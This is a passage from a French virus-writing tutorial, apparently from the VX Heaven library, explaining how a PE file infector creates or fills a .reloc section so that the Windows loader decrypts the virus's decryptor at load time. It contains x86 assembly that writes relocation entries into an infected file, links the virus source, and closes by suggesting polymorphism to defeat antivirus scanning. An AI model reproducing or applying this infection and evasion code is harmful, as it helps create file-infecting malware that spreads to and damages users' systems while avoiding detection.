<p>Nommez cette section ".reloc", avec pour flags 0x50000040. Pour VirtualAddress et RawAddress, à vous de voir. Pour VirtualSize, c'est simple, c'est:</p>
<pre>	Relocs.VirtualSize = (crypteur_len*2) + 8.</pre>
<p>*2 car une reloc fait deux bytes et + 8 pour le header du RELOC_CHUNK. Pour la RawSize, il suffit juste d'arrondir la VirtualSize sur le FileAlignement</p>
<p>Maintenant que nous sommes surs qu'une section .reloc existe, qu'elle soit déjà là ou qu'elle ait été crée par notre virus, il ne nous reste plus qu'à la remplir pour que notre décrypteur soit décrypté au chargement du PE infecté. Il nous faut localiser la section contenant les relocs et récupérer son RawOffset (adresse sur le disque), puis y écrire un RELOC_CHUNK qui appliquera des RELOC_32BITS sur chaque dword de notre decrypteur. Pour localiser la section des relocs (section crée ou déjà présente), la solution la plus sure/simple consiste à regarder à l'offset 0xA0 du PE Header où se trouve la RVA des relocs. Il suffit ensuite de parcourir chaque section header et celui qui possède comme VirtualAddress cette RVA est le header de la section des relocs. On regarde son RawOffset et c'est gagné.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;edx --&gt; PE Header du fichier en train d'être infecté.</span><br/>
<span style="color: black; font-style: italic;">;esi = VirusRVA (RVA du virus dans le PE infecté, souvent égal à SizeOfImage).</span><br/>
<span style="color: black; font-style: italic;">;edi = Adresse où est mappé le fichier (grace a MapViewOfFile)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0A0h</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Relocs RVA.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">18h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;edi --&gt; OptionalHeader.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movzx</span> &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">14h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;SizeOfOptionalHeader.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;edi --&gt; sections headers.</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movzx</span> &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">6</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ecx=nombre de sections </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">imul</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">28h</span><span style="color: #339933;">/</span><span style="color: #ff0000;">4</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Un header de section = 28h bytes.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">repnz</span> &nbsp; <span style="color: #00007f; font-weight: bold;">scasd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Cherche dans les sections celle qui a pour </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; erreur&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;VirtualAdress RelocRVA</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;(section .reloc deja là ou prealablement crée)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;RawOffset (VirtualAddress+8)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;edi--&gt; Fichier mappé grâce à MapViewOfFile.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ebx--&gt; Relocs (sur le disque toujours hein).</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;esi = VirusRVA = RelocBase.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr crypteur_len<span style="color: #339933;">*</span><span style="color: #ff0000;">2</span><span style="color: #339933;">+</span><span style="color: #ff0000;">8</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;taille des relocs (meme un peu +)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span>crypteur_len&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;nombre de relocs a effectuer</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;1ere reloc a l'offset (relatif a RelocBase) 0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;on commence ...</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3000h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;type de reloc: RELOC_32bits</span><br/>
relloop<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;écrit une reloc </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;un dword plus loin: prochaine reloc à effectuer</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;1 reloc = 1 word</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; relloop<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;marque la fin des relocs en mettant là </span><br/>
relocsdone<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;RelocBase du prochain RELOC_CHUNK à 0</span><br/>
&nbsp;</div>
<h2><a name="c3"></a>III. Code Source</h2>
<p><a href="files/vkz/Reloc.asm">Reloc.asm</a></p>
<h2><a name="c4"></a>IV. Conclusion</h2>
<p>Voila qui devrait donner un petit peu de boulot aux AVers. Néanmoins, cette technique possède ses faiblesses: en effet, vu que l'ImageBase doit être un multiple de 64k, il n'y à que le mot de poids fort de chaque dword de notre (dé)crypteur qui est (dé)crypté, rendant possible le scan. Une solution serait d'appliquer une RELOC_32bits non pas à chaque dword du décrypteur mais à chaque word, ou mieux encore, d'ajouter un peu de polymorphisme à l'affaire. Je ne sais pas ce qu'il en est des émulateurs, si ils prennent en charge les relocations ou non. Si vous etes au courant, mailez-moi.</p>
<p>Le virus en lui-meme reste tres tres simple et vous ne devriez pas avoir de problemes pour le comprendre. Si c'est le cas, la encore, n'hesitez pas a me demander.</p>
<div align="right">kaze/FAT<br/><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7d161c0718224d10053d041c151212531b0f">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script><br/>Epiknet #vxers</div>
[<a style="" href="/lib/?lang=FR&amp;index=WI#vkz01">Back to index</a>] [<a href="/lib/vkz01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vkz01">de</a><a href="/lib/index.php?lang=en&amp;id=vkz01">en</a><a href="/lib/index.php?lang=es&amp;id=vkz01">es</a><a href="/lib/index.php?lang=it&amp;id=vkz01">it</a><a href="/lib/index.php?lang=fr&amp;id=vkz01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vkz01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vkz01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vkz01">ua</a></div>
</body>
</html>
